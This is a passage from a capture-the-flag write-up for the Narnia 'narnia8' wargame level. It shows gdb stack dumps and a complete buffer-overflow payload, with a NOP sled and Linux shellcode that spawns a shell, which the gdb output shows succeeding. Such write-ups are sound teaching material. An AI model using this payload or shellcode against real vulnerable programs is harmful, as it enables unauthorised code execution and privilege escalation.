0xffffd68c:   0x41414141    0x41414141    0x41414141    0xffff4c8a
0xffffd69c:   0xffffd6a8    0x080484a7    0xffffd889    0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
```

Interesting, it seems that every time we increment to our payload by one byte, the address we need to match decrements. So lets keep this in mind and construct a payload, that can overwrite blah with itself.

```$
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
0xffffd68c:   0x41414141    0x41414141    0x41414141    0xffff4886
0xffffd69c:   0xffffd6a8    0x080484a7    0xffffd886    0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
```

Success! We have now made it past the address for blah, we can now overwrite the return address. Since we don't have access to a system call with shell, we need to insert some shell code.

```$
(gdb) run $(python -c 'print "A"*20 + "\x0c\xd8\xff\xff" + "AAAA" + "\x2c\xd6\xff\xff" + "\x90"*16 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89
\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print "A"*20 + "\x0c\xd8\xff\xff" + "AAAA" + "\x2c\xd6\xff\xff" + "\x90"*16 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
AAAAAAAAAAAAAAAAAAAA
                    ���AAAA,�������������������j1X�̀�É�jFX̀�
                                                            Rhn/shh//bi���̀

Breakpoint 1, 0x0804848a in func ()
(gdb) c
Continuing.
process 3519 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
```

So, if we had been outside gdb, we would now have shell access. So, let's try this outside gdb.

